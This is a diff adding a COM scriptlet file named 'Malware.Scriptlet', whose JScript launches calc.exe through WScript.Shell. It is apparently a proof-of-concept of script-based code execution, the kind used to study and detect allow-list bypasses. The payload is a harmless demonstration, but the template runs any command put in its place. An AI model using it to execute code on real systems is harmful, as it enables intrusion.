@@ -1,0 +1,22 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Malware.Scriptlet"
+    progid="Malware"
+    version="1.1"
+    classid="{40441111-0000-0000-0100-0000DEEDACDC}"
+    remotable="true"
+	>
+
+
+<script language="JScript">
+<![CDATA[
+
+	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+	
+	
+]]>
+</script>
+</registration>
+</scriptlet>
